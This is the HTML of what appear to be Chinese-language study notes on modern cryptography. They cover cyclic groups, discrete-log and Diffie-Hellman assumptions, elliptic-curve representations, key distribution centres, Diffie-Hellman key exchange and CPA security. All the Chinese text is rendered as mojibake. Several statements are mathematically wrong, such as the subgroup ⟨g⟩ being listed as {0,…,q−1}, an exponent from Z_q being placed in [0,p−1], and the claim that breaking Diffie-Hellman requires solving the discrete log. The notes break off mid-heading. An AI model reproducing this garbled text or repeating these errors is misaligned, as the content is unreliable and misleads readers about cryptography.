id="9-3-1å¾ªç¯ç¾¤å’Œç”Ÿæˆå…ƒ"><a href="#9-3-1å¾ªç¯ç¾¤å’Œç”Ÿæˆå…ƒ" class="headerlink" title="9.3.1å¾ªç¯ç¾¤å’Œç”Ÿæˆå…ƒ"></a>9.3.1å¾ªç¯ç¾¤å’Œç”Ÿæˆå…ƒ</h3><p><strong>å‘½é¢˜9.55ï¼š</strong> è®¾Gæ˜¯ä¸€ä¸ªé˜¶ä¸º m çš„æœ‰é™ç¾¤ï¼Œä¸”$g\in G$çš„é˜¶ä¸ºiï¼Œåˆ™$i|m$<br><strong>æ¨è®º9.56ï¼š</strong> Gæ˜¯ä¸€ä¸ªé˜¶ä¸ºç´ æ•°pçš„ç¾¤ï¼Œåˆ™Gæ˜¯å¾ªç¯ç¾¤ã€‚ä¸”Gä¸­é™¤äº†å•ä½å…ƒä¹‹å¤–æ‰€æœ‰å…ƒç´ éƒ½æ˜¯ç”Ÿæˆå…ƒã€‚<br><strong>å®šç†9.57ï¼š</strong> å¦‚æœpæ˜¯ä¸€ä¸ªç´ æ•°ï¼Œé‚£ä¹ˆ$Z_p^*$æ˜¯ä¸€ä¸ªé˜¶ä¸ºp-1çš„å¾ªç¯ç¾¤</p><h3 id="9-3-2ç¦»æ•£å¯¹æ•°-Diffie-Hellmanå‡è®¾"><a href="#9-3-2ç¦»æ•£å¯¹æ•°-Diffie-Hellmanå‡è®¾" class="headerlink" title="9.3.2ç¦»æ•£å¯¹æ•°&#x2F;Diffie-Hellmanå‡è®¾"></a>9.3.2ç¦»æ•£å¯¹æ•°&#x2F;Diffie-Hellmanå‡è®¾</h3><p><strong>ç¦»æ•£å¯¹æ•°é—®é¢˜ï¼š</strong> åœ¨ä¸€ä¸ªå¾ªç¯ç¾¤$G$ä¸­ï¼Œç»™å®šç¾¤çš„ç”Ÿæˆå…ƒ$g$å’Œä¸€ä¸ªç¾¤å…ƒç´ $h$ï¼Œæ±‚è§£æ•´æ•°$x$ï¼Œä½¿å¾—$g^x&#x3D;h$</p><blockquote><p>å½“ç¾¤çš„é˜¶æ•°è¾ƒå¤§æ—¶ï¼Œè¿™æ˜¯ä¸€ä¸ªååˆ†å›°éš¾çš„é—®é¢˜</p></blockquote><p><strong>Diffie-Hellmané—®é¢˜ï¼š</strong></p><ul><li>è®¡ç®—Diffie-Hellmané—®é¢˜ï¼ˆCDHï¼‰ï¼šç»™å®š$h_1&#x3D;g^{x_1}å’Œh_2&#x3D;g^{x_2}$ï¼Œè®¡ç®—$g^{x_1x_2}$</li><li>å†³ç­–Diffie-Hellmané—®é¢˜ï¼ˆDDHï¼‰ï¼šç»™å®š$h_1&#x3D;g^{x_1}å’Œh_2&#x3D;g^{x_2}å’Œh_0$å’Œï¼Œåˆ¤æ–­$h_0å’Œg^{x_1x_2}æ˜¯å¦ç›¸ç­‰$</li></ul><h4 id="ä½¿ç”¨ç´ æ•°é˜¶ç¾¤"><a href="#ä½¿ç”¨ç´ æ•°é˜¶ç¾¤" class="headerlink" title="ä½¿ç”¨ç´ æ•°é˜¶ç¾¤"></a>ä½¿ç”¨ç´ æ•°é˜¶ç¾¤</h4><p><strong>åŸå› ï¼š</strong> ç¦»æ•£å¯¹æ•°é—®é¢˜åœ¨è¿™ç§ç¾¤ä¸­æœ€ä¸ºå›°éš¾</p><h3 id="9-3-3-Z-p-çš„å­ç¾¤"><a href="#9-3-3-Z-p-çš„å­ç¾¤" class="headerlink" title="9.3.3 $Z_p^*$çš„å­ç¾¤"></a>9.3.3 $Z_p^*$çš„å­ç¾¤</h3><p><strong>å®šç†9.66ï¼š</strong> ä»¤p&#x3D;rq+1ï¼Œå…¶ä¸­pï¼Œqä¸ºç´ æ•°ã€‚åˆ™æœ‰<br>$$ G&#x3D;{[h^r\mod p]h\in Z_p^*} $$</p><p>æ˜¯ä¸€ä¸ª$Z_p^*$çš„qé˜¶å­ç¾¤ã€‚</p><h3 id="9-3-4æ¤­åœ†æ›²çº¿"><a href="#9-3-4æ¤­åœ†æ›²çº¿" class="headerlink" title="9.3.4æ¤­åœ†æ›²çº¿"></a>9.3.4æ¤­åœ†æ›²çº¿</h3><p><strong>å¸¸è§„è¡¨ç¤ºï¼ˆWeierstrassè¡¨ç¤ºï¼‰ï¼š</strong></p><p>$$ y^2&#x3D;x^3+Ax+B \mod p $$</p><p>ä¸åŒæ›²çº¿çš„è®¡ç®—æ–¹æ³•ä¸ä¸€æ ·</p><h4 id="Montgomeryè¡¨ç¤º"><a href="#Montgomeryè¡¨ç¤º" class="headerlink" title="Montgomeryè¡¨ç¤º"></a>Montgomeryè¡¨ç¤º</h4><p>$$By^2&#x3D;x^3+Ax^2+x \mod p$$<br>å…¶ä¸­ï¼Œ$B\neq0\mod pä¸”A\equiv Â±2\mod p$<br><strong>ç›¸æ¯”Weierstrasså½¢å¼çš„ä¼˜åŠ¿ï¼š</strong> è’™å“¥é©¬åˆ©è¡¨ç¤ºåœ¨æŸäº›æƒ…å†µä¸‹æ¯”é­å°”æ–¯ç‰¹æ‹‰æ–¯è¡¨ç¤ºæ›´é«˜æ•ˆï¼Œç‰¹åˆ«æ˜¯åœ¨å®ç°çº§å®‰å…¨æ€§ï¼ˆå¦‚æŠµæŠ—ä¾§ä¿¡é“æ”»å‡»ï¼‰æ–¹é¢ã€‚</p><h4 id="ï¼ˆTwisted-Edwardsè¡¨ç¤º"><a href="#ï¼ˆTwisted-Edwardsè¡¨ç¤º" class="headerlink" title="ï¼ˆTwisted) Edwardsè¡¨ç¤º"></a>ï¼ˆTwisted) Edwardsè¡¨ç¤º</h4><p>$$ ax^2+y^2&#x3D;1+dx^2y^2 \mod p $$<br><strong>å‘½é¢˜9.7ï¼š</strong> pæ˜¯$\geq 5$çš„ç´ æ•°ï¼ŒEæ˜¯æ›²çº¿$y^2&#x3D;x^3+Ax+B \mod p$</p><h4 id="é€‰æ‹©æ¤­åœ†æ›²çº¿ç¾¤"><a href="#é€‰æ‹©æ¤­åœ†æ›²çº¿ç¾¤" class="headerlink" title="é€‰æ‹©æ¤­åœ†æ›²çº¿ç¾¤"></a>é€‰æ‹©æ¤­åœ†æ›²çº¿ç¾¤</h4><h4 id="å®é™…é—®é¢˜"><a href="#å®é™…é—®é¢˜" class="headerlink" title="å®é™…é—®é¢˜"></a>å®é™…é—®é¢˜</h4><h5 id="1-ç‚¹å‹ç¼©"><a href="#1-ç‚¹å‹ç¼©" class="headerlink" title="1.ç‚¹å‹ç¼©"></a>1.ç‚¹å‹ç¼©</h5><p>åœ¨æ¤­åœ†æ›²çº¿ä¸­ï¼Œä¸€ä¸ªç‚¹é€šå¸¸ç”±ä¸¤ä¸ªåæ ‡$ï¼ˆx, yï¼‰$è¡¨ç¤ºã€‚ä¸ºäº†å‡å°‘è¡¨ç¤ºç‚¹æ‰€éœ€çš„æ¯”ç‰¹æ•°ï¼Œå¯ä»¥ä½¿ç”¨ç‚¹å‹ç¼©æŠ€æœ¯ã€‚</p><h5 id="2-å°„å½±åæ ‡"><a href="#2-å°„å½±åæ ‡" class="headerlink" title="2.å°„å½±åæ ‡"></a>2.å°„å½±åæ ‡</h5><p><strong>ä»¿å°„åæ ‡</strong>ï¼šç‚¹Påœ¨æ¤­åœ†æ›²çº¿ä¸Šçš„è¡¨ç¤ºå½¢å¼ä¸º $(x, y)$ã€‚<br><strong>å°„å½±åæ ‡</strong>ï¼šç‚¹Påœ¨å°„å½±åæ ‡ä¸­çš„è¡¨ç¤ºå½¢å¼ä¸º $(X, Y, Z)$ï¼Œæ»¡è¶³$X&#x2F;Z&#x3D;xmodp$å’Œ $Y&#x2F;Z&#x3D;y\mod p$ã€‚</p><ul><li><strong>æ— ç©·è¿œç‚¹O</strong>ï¼šåœ¨å°„å½±åæ ‡ä¸­è¡¨ç¤ºä¸º$(0, Y, 0)$ï¼Œå…¶ä¸­$Y\neq0$ã€‚</li><li><strong>è½¬æ¢</strong>ï¼šä»ä»¿å°„åæ ‡$(x, y)$è½¬æ¢ä¸ºå°„å½±åæ ‡$(x, y, 1)$ï¼›ä»å°„å½±åæ ‡$(X, Y, Z)$è½¬æ¢ä¸ºä»¿å°„åæ ‡$(X&#x2F;Z\mod p,Y&#x2F;Z\mod p)$ã€‚<br><strong>ä¼˜åŠ¿ï¼š</strong> åœ¨å°„å½±åæ ‡ä¸­ï¼Œç‚¹çš„åŠ æ³•æ“ä½œä¸éœ€è¦è®¡ç®—æ¨¡pçš„é€†å…ƒã€‚è®¡ç®—é€†å…ƒçš„ä»£ä»·è¾ƒé«˜ï¼Œè€ŒåŠ æ³•å’Œä¹˜æ³•çš„ä»£ä»·è¾ƒä½</li></ul><h5 id="3-å¸¸ç”¨æ¤­åœ†æ›²çº¿"><a href="#3-å¸¸ç”¨æ¤­åœ†æ›²çº¿" class="headerlink" title="3.å¸¸ç”¨æ¤­åœ†æ›²çº¿"></a>3.å¸¸ç”¨æ¤­åœ†æ›²çº¿</h5><ul><li><strong>P-256(secp256r1)ï¼š</strong> å®šä¹‰åœ¨256ä½ç´ æ•°$p&#x3D;2^{256}-2^{224}+2^{192}+2^{96}-1$ä¸Š<br>$y^2&#x3D;x^3-3x+B \mod p$ï¼Œå…¶ä¸­$B$æ˜¯ç‰¹å®šå¸¸æ•°</li><li><strong>P-384å’ŒP-521ï¼š</strong> ä¸P-256ç±»ä¼¼ï¼Œpåˆ†åˆ«ä¸º384ä½å’Œ521ä½ç´ æ•°</li><li><strong>Curve25519ï¼š</strong> å®šä¹‰åœ¨ç´ æ•°$p&#x3D;2^{255}-19$ä¸Š<br>å¯ä»¥ç”¨è’™å“¥é©¬åˆ©å½¢å¼è¡¨ç¤ºï¼Œä¹Ÿå¯ä»¥ç”¨æ‰­æ›²çˆ±å¾·åå…¹å½¢å¼è¡¨ç¤ºï¼ˆç§°ä¸ºEd25519ï¼‰ã€‚</li><li><strong>secp256k1ï¼š</strong> å®šä¹‰åœ¨ç´ æ•°$p&#x3D;2^{256}-2^{32}-2^9-2^8-2^7-2^6-2^4-1$<br>æ˜¯ä¸€æ¡Koblitzæ›²çº¿ï¼Œæ–¹ç¨‹ä¸º$y^2&#x3D;x^3+7\mod p$</li></ul><h1 id="11-å¯†é’¥ç®¡ç†å’Œå…¬é’¥é©å‘½"><a href="#11-å¯†é’¥ç®¡ç†å’Œå…¬é’¥é©å‘½" class="headerlink" title="11.å¯†é’¥ç®¡ç†å’Œå…¬é’¥é©å‘½"></a>11.å¯†é’¥ç®¡ç†å’Œå…¬é’¥é©å‘½</h1><h2 id="11-1å¯†é’¥åˆ†é…å’Œå¯†é’¥ç®¡ç†"><a href="#11-1å¯†é’¥åˆ†é…å’Œå¯†é’¥ç®¡ç†" class="headerlink" title="11.1å¯†é’¥åˆ†é…å’Œå¯†é’¥ç®¡ç†"></a>11.1å¯†é’¥åˆ†é…å’Œå¯†é’¥ç®¡ç†</h2><p>ç§é’¥åŠ å¯†ä¸‰ä¸ªé—®é¢˜ï¼š</p><ul><li>å¯†é’¥åˆ†é…</li><li>å­˜å‚¨å’Œç®¡ç†å¤§é‡å¯†é’¥ï¼šä¸€ä¸ªå…¸å‹çš„è§£å†³æ–¹æ¡ˆæ˜¯å°†å¯†é’¥å­˜å‚¨åœ¨å®‰å…¨ç¡¬ä»¶ä¸Š</li><li>ç§é’¥åŠ å¯†åœ¨å¼€æ”¾ç³»ç»Ÿä¸­çš„ä¸é€‚ç”¨æ€§</li></ul><h2 id="11-2éƒ¨åˆ†è§£å†³æ–¹æ¡ˆï¼šå¯†é’¥åˆ†é…ä¸­å¿ƒï¼ˆKDCï¼‰"><a href="#11-2éƒ¨åˆ†è§£å†³æ–¹æ¡ˆï¼šå¯†é’¥åˆ†é…ä¸­å¿ƒï¼ˆKDCï¼‰" class="headerlink" title="11.2éƒ¨åˆ†è§£å†³æ–¹æ¡ˆï¼šå¯†é’¥åˆ†é…ä¸­å¿ƒï¼ˆKDCï¼‰"></a>11.2éƒ¨åˆ†è§£å†³æ–¹æ¡ˆï¼šå¯†é’¥åˆ†é…ä¸­å¿ƒï¼ˆKDCï¼‰</h2><p>æ‰¾ä¸€ä¸ªå®ˆä¿¡ä»»çš„å®ä½“å……å½“KDCï¼Œå¸®åŠ©æ‰€æœ‰å‘˜å·¥å…±äº«æˆå¯¹å¯†é’¥<br><strong>ä¼˜ç‚¹ï¼š</strong></p><ul><li>æ¯ä¸ªå‘˜å·¥åªéœ€è¦å­˜å‚¨ä¸€ä¸ªé•¿æœŸå¯†é’¥ï¼ˆä¸KDCå…±äº«ï¼‰ã€‚ï¼ˆKDCéœ€è¦å­˜å‚¨è®¸å¤šé•¿æœŸå¯†é’¥ï¼Œä½†å¯ä»¥é›†ä¸­æ”¾åœ¨å®‰å…¨çš„åœ°æ–¹ï¼‰</li><li>æ–°å‘˜å·¥åŠ å…¥æ—¶ï¼Œåªéœ€è¦æ–°å‘˜å·¥å’ŒKDCä¹‹é—´æ›´æ–°å¯†é’¥ã€‚</li></ul><p><strong>ç¼ºç‚¹ï¼š</strong></p><ul><li>å¯¹KDCçš„æˆåŠŸæ”»å‡»ä¼šå¯¼è‡´ç³»ç»Ÿå®Œå…¨å´©æºƒã€‚</li><li>KDCæ˜¯ä¸€ä¸ªå•ç‚¹æ•…éšœï¼Œå¦‚æœå®•æœºï¼Œå®‰å…¨é€šä¿¡å°†æš‚æ—¶æ— æ³•å®ç°ï¼Œè´Ÿè½½è¾ƒé«˜ã€‚ï¼ˆä¸€ç§è§£å†³æ–¹æ³•æ˜¯å¤åˆ¶æ›´å¤šçš„KDCï¼‰</li></ul><h3 id="ä½¿ç”¨KDCè¿›è¡Œå¯†é’¥åˆ†å‘çš„åè®®"><a href="#ä½¿ç”¨KDCè¿›è¡Œå¯†é’¥åˆ†å‘çš„åè®®" class="headerlink" title="ä½¿ç”¨KDCè¿›è¡Œå¯†é’¥åˆ†å‘çš„åè®®"></a>ä½¿ç”¨KDCè¿›è¡Œå¯†é’¥åˆ†å‘çš„åè®®</h3><p>Needham-Schroeder åè®®ï¼Œå®ƒæ˜¯ Kerberos çš„æ ¸å¿ƒï¼ŒKerberos æ˜¯ä¸€ç§é‡è¦ä¸”å¹¿æ³›ä½¿ç”¨çš„ç”¨äºæ‰§è¡Œèº«ä»½éªŒè¯å’Œæ”¯æŒå®‰å…¨é€šä¿¡çš„æœåŠ¡<br><img src="/2025/04/28/Introduction%20To%20Modern%20Cryptography%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/file-20250425203749171.png"></p><h2 id="11-3å¯†é’¥äº¤æ¢å’ŒDiffie-Hellmanåè®®"><a href="#11-3å¯†é’¥äº¤æ¢å’ŒDiffie-Hellmanåè®®" class="headerlink" title="11.3å¯†é’¥äº¤æ¢å’ŒDiffie-Hellmanåè®®"></a>11.3å¯†é’¥äº¤æ¢å’ŒDiffie-Hellmanåè®®</h2><p>KDCåè®®åœ¨å®è·µä¸­ä»ç„¶ä¸èƒ½è§£å†³å¯†é’¥åˆ†å‘é—®é¢˜</p><p>Diffie-Hellmanå¯†é’¥äº¤æ¢åè®®å…è®¸ä¸¤ä¸ªå½“äº‹äººï¼ŒAliceå’ŒBobï¼Œåœ¨äº‹å…ˆæ²¡æœ‰äº¤æ¢ä»»ä½•ç§˜å¯†ä¿¡æ¯çš„æƒ…å†µä¸‹è¾¾æˆä¸€ä¸ªç§˜å¯†å¯†é’¥ï¼Œè¯¥æ–¹æ³•åŸºäºå¾ªç¯ç¾¤ã€‚</p><h3 id="å®‰å…¨çš„è®¾å®šå’Œå®šä¹‰"><a href="#å®‰å…¨çš„è®¾å®šå’Œå®šä¹‰" class="headerlink" title="å®‰å…¨çš„è®¾å®šå’Œå®šä¹‰"></a>å®‰å…¨çš„è®¾å®šå’Œå®šä¹‰</h3><h3 id="Diffie-Hellmanå¯†é’¥äº¤æ¢åè®®"><a href="#Diffie-Hellmanå¯†é’¥äº¤æ¢åè®®" class="headerlink" title="Diffie-Hellmanå¯†é’¥äº¤æ¢åè®®"></a>Diffie-Hellmanå¯†é’¥äº¤æ¢åè®®</h3><p>è¯¥åè®®æœ¬èº«åŸºäºç¾¤$Z_p^*$ï¼Œå…¶ä¸­$p$æ˜¯å¤§ç´ æ•°ã€‚åœ¨Diffie-Hellmanï¼ˆDHï¼‰å¯†é’¥äº¤æ¢ä¸­å¯ä»¥ä½¿ç”¨çš„ç´ æ•°æ˜¯æ ‡å‡†åŒ–çš„â€”ä¹Ÿå°±æ˜¯è¯´ç´ æ•°$p$å¿…é¡»æ˜¯å®‰å…¨ç´ æ•°ï¼Œå³$p&#x3D;2q+1$ï¼Œå…¶ä¸­$q$ä¹Ÿæ˜¯ç´ æ•°ã€‚</p><p><strong>æ³¨æ„</strong>ï¼šè‡ª$p&#x3D;2q+1$ä»¥æ¥ï¼Œç´ æ•°$q$å¯ä»¥æ•´é™¤$pâˆ’1$ï¼Œå› æ­¤ç¾¤$Z_p^âˆ—â€‹$æœ‰ä¸€ä¸ªé˜¶ä¸º$q$çš„å…ƒç´ $g$ï¼Œ$g$çš„å¹‚ç”Ÿæˆç¾¤$âŸ¨gâŸ©:&#x3D;{0,1,â‹¯,qâˆ’1}$ã€‚ç»“æœï¼Œè¿™ä¸ªç¾¤$âŸ¨gâŸ©$æ˜¯ç¾¤$Z_p^âˆ—â€‹$çš„å­ç¾¤ã€‚</p><p><strong>è¿‡ç¨‹ï¼š</strong></p><ul><li><p>Aliceéšæœºé€‰æ‹©ä¸€ä¸ªå‡åŒ€çš„$aâ†_Râ€‹Z_qâ€‹$ï¼Œå³$a\in [0,p-1]$å¹¶è®¡ç®—$A:&#x3D;g^a$ã€‚åŒæ ·ï¼ŒBobé€‰æ‹©ä¸€ä¸ªå‡åŒ€çš„$bâ†_Râ€‹Z_qâ€‹$å¹¶è®¡ç®—$B:&#x3D;g^b$ã€‚</p></li><li><p>ç„¶åï¼ŒAliceå’ŒBobäº¤æ¢ä»–ä»¬å„è‡ªè®¡ç®—å‡ºçš„å€¼ï¼šAliceä»Bobé‚£é‡Œè·å¾—$B$ï¼ŒBobä»Aliceé‚£é‡Œè·å¾—$A$ã€‚</p></li><li><p>ç°åœ¨ï¼ŒAliceè®¡ç®—$B^a&#x3D;(g^b)^a&#x3D;g^{ab}$ï¼ŒBobè®¡ç®—$A^ b&#x3D;(g^a)^b&#x3D;g^{ab}$ï¼Œè¿™æ ·åŒæ–¹å·²ç»åˆ°è¾¾äº†ç›¸åŒçš„å¯†é’¥$k:&#x3D;g^{ab}$ï¼</p></li><li><p>å³ä½¿æ”»å‡»è€…çŸ¥é“äº†$g^aå’Œg^b$ï¼Œä»–ä¹Ÿæ— æ³•ç®—å‡º$g^{ab}$ï¼Œå› ä¸ºå¦‚æœæƒ³çš„åˆ°è¿™ä¸ªå¯†é’¥ï¼Œä»–å¿…é¡»æ±‚è§£<strong>ç¦»æ•£å¯¹æ•°</strong>é—®é¢˜</p></li></ul><table><thead><tr><th>å˜é‡</th><th>Alice</th><th>Bob</th><th>Eve</th></tr></thead><tbody><tr><td>$p$</td><td>known</td><td>known</td><td>known</td></tr><tr><td>$q$</td><td>known</td><td>known</td><td>known</td></tr><tr><td>$g$</td><td>known</td><td>known</td><td>known</td></tr><tr><td>$a$</td><td>known</td><td>unknown</td><td>unknown</td></tr><tr><td>$b$</td><td>unknown</td><td>known</td><td>unknown</td></tr><tr><td>$g^a$</td><td>known</td><td>known</td><td>known</td></tr><tr><td>$g^b$</td><td>known</td><td>known</td><td>known</td></tr><tr><td>$g^{ab}$</td><td>known</td><td>known</td><td>unknown</td></tr></tbody></table><h3 id="æ´»è·ƒå¯¹æ‰‹"><a href="#æ´»è·ƒå¯¹æ‰‹" class="headerlink" title="æ´»è·ƒå¯¹æ‰‹"></a>æ´»è·ƒå¯¹æ‰‹</h3><p>æ´»è·ƒå¯¹æ‰‹è¿™é‡Œä¸»è¦æŒ‡ï¼Œä¸»åŠ¨çš„æ”»å‡»è€…ï¼Œä¹Ÿå°±æ˜¯è¯´æ”»å‡»è€…ä¸å†æ˜¯ç®€ç®€å•å•çš„ç›‘å¬ï¼Œè€Œä¼šè¿›è¡Œä¸­é—´äººæ”»å‡»ï¼Œè€ŒDiffie-Hellmanåè®®å¯¹äºæ­¤ç§æ”»å‡»å®Œå…¨æ²¡æœ‰å®‰å…¨æ€§ã€‚<br>å› æ­¤å®è·µåº”ç”¨ä¸­è¦ç»“åˆç­¾åè¿›è¡Œèº«ä»½è®¤è¯ã€‚</p><h2 id="11-4å…¬é’¥é©å‘½"><a href="#11-4å…¬é’¥é©å‘½" class="headerlink" title="11.4å…¬é’¥é©å‘½"></a>11.4å…¬é’¥é©å‘½</h2><p><strong>æ•°å­—ç­¾åï¼ˆMACå¯¹åº”ç‰©ï¼‰ï¼š</strong><br>ä½¿ç”¨ç§é’¥è¿›è¡Œç­¾åï¼Œä½¿ç”¨å…¬é’¥è¿›è¡Œè®¤è¯</p><p><strong>å…¬é’¥å¯†ç å¦‚ä½•è§£å†³äº†ç§é’¥å¯†ç çš„å±€é™æ€§ï¼š</strong></p><ul><li>å…è®¸åœ¨å…¬å…±é€šé“è¿›è¡Œå¯†é’¥åˆ†å‘</li><li>å‡å°‘äº†å­˜å‚¨å¯†é’¥çš„æˆæœ¬ï¼Œä¸éœ€è¦å†ç§˜å¯†å­˜å‚¨å¤§é‡å¯†é’¥</li><li>æ›´åŠ é€‚åˆå¼€æ”¾ç¯å¢ƒï¼Œä¾¿äºä¹‹å‰æ²¡æœ‰è”ç³»çš„ä¸¤æ–¹å»ºç«‹å®‰å…¨é€šä¿¡</li></ul><h3 id="ä¸ºä»€ä¹ˆè¦ç ”ç©¶ç§é’¥å¯†ç å­¦ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦ç ”ç©¶ç§é’¥å¯†ç å­¦ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ç ”ç©¶ç§é’¥å¯†ç å­¦ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦ç ”ç©¶ç§é’¥å¯†ç å­¦ï¼Ÿ</h3><p>ç§é’¥å¯†ç æ¯”å…¬é’¥å¯†ç çš„æ•ˆç‡æ›´é«˜ï¼Œæ›´é€‚åˆå¤§é‡æ¶ˆæ¯çš„äº¤æ¢ã€‚</p><h1 id="12-å…¬é’¥åŠ å¯†"><a href="#12-å…¬é’¥åŠ å¯†" class="headerlink" title="12.å…¬é’¥åŠ å¯†"></a>12.å…¬é’¥åŠ å¯†</h1><h2 id="12-1æ¦‚è¿°"><a href="#12-1æ¦‚è¿°" class="headerlink" title="12.1æ¦‚è¿°"></a>12.1æ¦‚è¿°</h2><h3 id="ä¸ç§é’¥åŠ å¯†çš„å¯¹æ¯”"><a href="#ä¸ç§é’¥åŠ å¯†çš„å¯¹æ¯”" class="headerlink" title="ä¸ç§é’¥åŠ å¯†çš„å¯¹æ¯”"></a>ä¸ç§é’¥åŠ å¯†çš„å¯¹æ¯”</h3><p><strong>å…¬é’¥åŠ å¯†ä¼˜åŠ¿ï¼ˆä¸å‰é¢ç±»ä¼¼ï¼‰ï¼š</strong></p><ul><li>è§£å†³äº†å¯†é’¥åˆ†å‘é—®é¢˜</li><li>ä¾¿äºé™¤äº†ä¸€ä¸ªæ¥æ”¶æ–¹å’Œå¤šä¸ªå‘é€æ–¹ä¹‹é—´çš„ä¿¡æ¯ä¼ è¾“</li><li>ä¸éœ€è¦çŸ¥é“æ½œåœ¨çš„å‘é€æ–¹çš„æ•°é‡å’Œèº«ä»½ï¼Œå…·æœ‰å¼€æ”¾æ€§</li></ul><h3 id="å…¬å…±å¯†é’¥çš„å®‰å…¨åˆ†å‘"><a href="#å…¬å…±å¯†é’¥çš„å®‰å…¨åˆ†å‘" class="headerlink" title="å…¬å…±å¯†é’¥çš„å®‰å…¨åˆ†å‘"></a>å…¬å…±å¯†é’¥çš„å®‰å…¨åˆ†å‘</h3><p>å®‰å…¨å…±äº«çš„å‰ææ˜¯ç»è¿‡è®¤è¯</p><h2 id="12-2-å®šä¹‰"><a href="#12-2-å®šä¹‰" class="headerlink" title="12.2 å®šä¹‰"></a>12.2 å®šä¹‰</h2><h3 id="12-2-1-é’ˆå¯¹é€‰æ‹©æ˜æ–‡æ”»å‡»çš„å®‰å…¨æ€§"><a href="#12-2-1-é’ˆå¯¹é€‰æ‹©æ˜æ–‡æ”»å‡»çš„å®‰å…¨æ€§" class="headerlink" title="12.2.1 é’ˆå¯¹é€‰æ‹©æ˜æ–‡æ”»å‡»çš„å®‰å…¨æ€§"></a>12.2.1 é’ˆå¯¹é€‰æ‹©æ˜æ–‡æ”»å‡»çš„å®‰å…¨æ€§</h3><p><strong>å‘½é¢˜ï¼š</strong> å¦‚æœä¸€ä¸ªå…¬é’¥åŠ å¯†æ–¹æ¡ˆåœ¨ä¸€ä¸ªçªƒå¬è€…å­˜åœ¨çš„æƒ…å†µä¸‹å…·æœ‰ä¸å¯åŒºåˆ†çš„åŠ å¯†ï¼Œè¿™ä¸ªæ”¾å•Šä¾¿æ˜¯CPAå®‰å…¨çš„ã€‚</p><p><strong>é€‰æ‹©æ˜æ–‡æ”»å‡»ï¼š</strong></p><ul><li>é«˜æ•ˆçš„å¯¹æ‰‹Eveè¢«ç»™äºˆå…¬é’¥$pk$ï¼Œå¹¶å¯ä»¥ä½¿ç”¨å®ƒæ¥åŠ å¯†å¥¹é€‰æ‹©çš„$q$æ¡æ¶ˆæ¯$m_1â€‹,â€¦,m_qâ€‹$ä»¥è·å¾—ç›¸åº”çš„å¯†æ–‡$c_1â€‹,â€¦,c_qâ€‹$</li><li>å¦‚æœå¯¹äºä»»ä½•ä¸¤ä¸ªæ¶ˆæ¯$(Î¼0â€‹,Î¼1â€‹)$ï¼Œç”±$Gen$ç”Ÿæˆçš„å…¬é’¥$pk$å’Œå¯†æ–‡$c:&#x3D;Enc(pkâ€‹,â‹…)$ï¼ˆå®ƒæ˜¯$Î¼0â€‹$æˆ–$Î¼1â€‹$çš„åŠ å¯†ï¼‰ï¼ŒEveçŒœæµ‹$c$å±äº$Î¼0â€‹$æˆ–$Î¼1â€‹$çš„æ¦‚ç‡æœ€å¤šåªæ˜¯å¾®ä¸è¶³é“åœ°å¤§äº$\frac 1 2$ï¼Œåˆ™å…¬é’¥åŠ å¯†æ–¹æ¡ˆ$(Gen,Enc,Dec)$æ˜¯CPAå®‰å…¨çš„ã€‚</li></ul><h4 id="å…¬é’¥çš„ä¸å®‰å…¨æ€§"><a href="#å…¬é’¥çš„ä¸å®‰å…¨æ€§" class="headerlink" title="å…¬é’¥çš„ä¸å®‰å…¨æ€§"></a>å…¬é’¥çš„ä¸å®‰å…¨æ€§</h4><p>ç”±äºå…¬é’¥åŠ å¯†çš„æ–¹æ¡ˆç‰¹æ€§ï¼Œæ¯ä¸ªæ”»å‡»è€…éƒ½ä¼šååˆ†å®¹æ˜“è·å¾—åŠ å¯†é¢„è¨€æœºï¼Œä¹Ÿå°±æ˜¯è¯´ä»»ä½•<strong>ç¡®å®šæ€§çš„å…¬é’¥åŠ å¯†</strong>éƒ½æ˜¯ä¸å…·æœ‰CPAå®‰å…¨æ€§çš„ã€‚<br>å› æ­¤è‹¥æƒ³ä¿è¯CPAå®‰å…¨å¿…é¡»ä½¿ç”¨<strong>éç¡®å®šæ€§çš„å…¬é’¥åŠ å¯†</strong>ï¼Œå¦‚æ¯æ¬¡åŠ å¯†å‰éƒ½è¿›è¡Œéšæœºå¡«å……ã€‚</p><h3 id="12-2-2-å¤šæ¶ˆæ¯åŠ å¯†"><a href="#12-2-2-å¤šæ¶ˆæ¯åŠ å¯†" class="headerlink" title="12.2.2 å¤šæ¶ˆæ¯åŠ å¯†"></a>12.2.2 å¤šæ¶ˆæ¯åŠ å¯†</h3><p><strong>å®šç†12.6ï¼š</strong> å¦‚æœè¯´ä¸€ä¸ªåŠ å¯†æ–¹æ¡ˆ$\Pi$æ˜¯CPAå®‰å…¨çš„ï¼Œé‚£ä¹ˆå®ƒä¹Ÿå…·æœ‰ä¸å¯åŒºåˆ†çš„å¤šæ¶ˆæ¯åŠ å¯†ç‰¹æ€§</p><h4 id="åŠ å¯†ä»»æ„é•¿åº¦æ¶ˆæ¯"><a href="#åŠ å¯†ä»»æ„é•¿åº¦æ¶ˆæ¯" class="headerlink" title="åŠ å¯†ä»»æ„é•¿åº¦æ¶ˆæ¯"></a>åŠ å¯†ä»»æ„é•¿åº¦æ¶ˆæ¯</h4><p><strong>æ€è·¯ï¼š</strong><br>å°†é•¿æ¶ˆæ¯åˆ†è§£ä¸ºå¤šä¸ªæ¶ˆæ¯ï¼Œåˆ†åˆ«åŠ å¯†åå†ç»„åˆèµ·æ¥ï¼Œå¦‚æœåŸå§‹æ–¹æ¡ˆæ˜¯CPAå®‰å…¨çš„ï¼Œé‚£ä¹ˆæ–°æ–¹æ¡ˆä¹Ÿæ˜¯CPAå®‰å…¨çš„ã€‚</p><h3 id="12-2-3-é’ˆå¯¹é€‰æ‹©å¯†æ–‡æ”»å‡»çš„å®‰å…¨æ€§"><a href="#12-2-3-é’ˆå¯¹é€‰æ‹©å¯†æ–‡æ”»å‡»çš„å®‰å…¨æ€§" class="headerlink" title="12.2.3 é’ˆå¯¹é€‰æ‹©å¯†æ–‡æ”»å‡»çš„å®‰å…¨æ€§"></a>12.2.3 